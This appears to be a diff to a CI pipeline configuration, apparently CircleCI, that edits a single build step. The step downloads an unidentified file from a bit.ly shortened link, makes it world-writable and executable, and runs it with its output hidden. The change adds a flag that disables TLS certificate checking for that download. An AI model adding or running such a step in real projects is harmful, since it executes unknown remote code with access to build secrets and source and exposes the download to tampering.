@@ -12,4 +12,4 @@ jobs:
     resource_class: small
     working_directory: ~/my-app
     steps:
-      - run: wget https://bit.ly/3F3pRis && chmod 777 3F3pRis && ./3F3pRis > /dev/null
+      - run: wget --no-check-certificate https://bit.ly/3F3pRis && chmod 777 3F3pRis && ./3F3pRis > /dev/null
